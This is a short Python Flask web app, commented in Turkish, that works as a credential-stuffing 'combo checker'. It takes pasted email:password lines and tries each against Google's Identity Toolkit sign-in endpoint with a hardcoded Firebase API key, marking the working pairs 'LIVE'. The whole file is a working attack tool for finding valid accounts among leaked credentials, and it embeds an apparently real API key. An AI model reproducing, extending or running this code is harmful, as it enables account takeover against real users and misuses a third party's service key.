import requests
from flask import Flask, render_template, request, jsonify

app = Flask(__name__)

# ANAHTARINI BURAYA YAZ
API_KEY = "AIzaSyApwFQ4Refm3F7jygYcBogi3r8W4dtXZDY"

def check_account(email, password):
    url = f"https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key={API_KEY}"
    payload = {"email": email, "password": password, "returnSecureToken": True}
    
    try:
        r = requests.post(url, json=payload, timeout=10)
        data = r.json()
        
        if r.status_code == 200:
            return "LIVE"
        
        # BAD yerine Google'ın hata kodunu döndürüyoruz
        error_message = data.get('error', {}).get('message', 'BILINMEYEN_HATA')
        return error_message
        
    except Exception as e:
        return "BAGLANTI_HATASI"

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/start_scan', methods=['POST'])
def start_scan():
    data = request.json
    combos = data.get('combos', '').splitlines()
    results = []
    
    for line in combos:
        if ":" in line:
            email, password = line.split(":", 1)
            status = check_account(email.strip(), password.strip())
            results.append({"account": line, "status": status})
    
    return jsonify({"results": results})

if __name__ == '__main__':
    app.run(debug=True)
